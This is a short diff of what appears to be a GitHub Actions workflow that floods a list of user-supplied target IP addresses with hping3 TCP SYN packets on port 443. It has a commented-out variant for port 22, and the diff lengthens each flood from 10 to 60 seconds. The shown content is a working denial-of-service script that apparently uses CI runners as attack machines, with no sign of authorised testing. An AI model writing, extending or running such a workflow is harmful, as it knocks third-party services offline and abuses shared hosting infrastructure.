@@ -68,7 +68,7 @@ jobs:
           IP_LIST=$(echo "${{ inputs.target_ips }}" | tr ',' ' ')
           echo "IP_LIST=${IP_LIST}" >> $GITHUB_ENV
 
-          timeout 180s yarn start
+          timeout 120s yarn start
 
       - name: Step 2
         # if: false
@@ -81,7 +81,7 @@ jobs:
           for IP in "${IP_LIST[@]}"; do
             echo $IP
             echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-            sudo timeout 10s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
+            sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
           done
           
           # for i in {1..4}; do
@@ -89,4 +89,4 @@ jobs:
           # done
           # wait
 
-          # sudo timeout 10s hping3 -S --flood -V -d 65400 -p 22 $IP
+          # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 22 $IP
